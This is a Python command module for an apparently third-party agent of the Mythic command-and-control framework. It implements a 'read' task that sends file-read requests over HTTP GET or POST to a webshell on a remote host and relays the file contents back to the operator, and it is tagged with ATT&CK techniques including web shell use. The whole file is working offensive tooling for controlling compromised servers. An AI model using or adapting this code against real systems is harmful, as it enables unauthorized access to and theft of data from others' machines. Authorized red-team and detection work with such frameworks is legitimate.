from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
from enyxma.WebshellRPC import WebshellRPC
import logging

logger = logging.getLogger(__name__)

class ReadArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        # Define the "file_path" parameter
        self.args = [
            CommandParameter(name="file_path",
                             type=ParameterType.String,
                             description="Remote file path to read")
        ]

    async def parse_arguments(self):
        # If there is any input, parse it
        if len(self.command_line.strip()) > 0:
            # If the input starts with '{', assume it's a JSON string
            if self.command_line.strip()[0] == '{':
                self.load_args_from_json_string(self.command_line.strip())
            else:
                self.add_arg("file_path", self.command_line.strip())
        else:
            raise ValueError("Missing file_path")


class ReadCommand(CommandBase):
    cmd = "read"
    needs_admin = False
    help_cmd = "read <file_path>"
    description = "Read and return the contents of a file on the remote system"
    version = 1
    author = "@Termindiego25"
    argument_class = ReadArguments
    # Map the command to the appropriate MITRE ATT&CK techniques
    attackmapping = ["T1083", "T1071.001", "T1132.001", "T1505.003"]

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        """
        Create a new task for executing a read command on the remote system using the webshell.
        The command is retrieved from the task arguments, then sent via WebshellRPC using either GET or POST as specified.
        """
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=False,
            Completed=True,
            DisplayParams=taskData.args.get_arg("file_path")
        )

        # Construct the command in the form "read <file_path>"
        user_input = taskData.args.get_arg("file_path")
        command = f"read {user_input}"
        logger.info(f"Preparing read command: {command}")

        try:
            # Determine the request method from the C2 profile parameters
            requestType = taskData.C2Profiles[0].Parameters.get("request_type", "POST").upper()
            logger.info(f"Request type for read: {requestType}")
            
            # Dispatch the command based on the chosen HTTP method
            if requestType == "GET":
                response_data = await WebshellRPC.GetRequest(
                    taskData.Payload.UUID, command.encode(), taskData
                )
            else:
                response_data = await WebshellRPC.PostRequest(
                    taskData.Payload.UUID, command.encode(), taskData
                )

            # Check if the response data is empty; if so, mark the task as complete without output.
            if len(response_data) == 0:
                logger.warning("Received empty response data from the webshell.")
                taskData.args.set_manual_args(command)
                response.Completed = True
                response.Success = True
                return response

            # Send the raw response to Mythic.
            await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                TaskID=taskData.Task.ID,
                Response=response_data
            ))
            response.Success = True
        except Exception as e:
            logger.exception(f"Error executing command: {e}")
            response.TaskStatus = "error: processing"
            response.Error = f"Error during file reading: {str(e)}"

        # If there is an error, report it to Mythic.
        if response.Error != "":
            await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                TaskID=taskData.Task.ID,
                Response=response.Error.encode(),
            ))
        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        """
        Process the final response received from the remote webshell command execution.
        This function sends the response back to Mythic.
        """
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
            TaskID=task.Task.ID,
            Response=response.encode("UTF-8"),
        ))
        return resp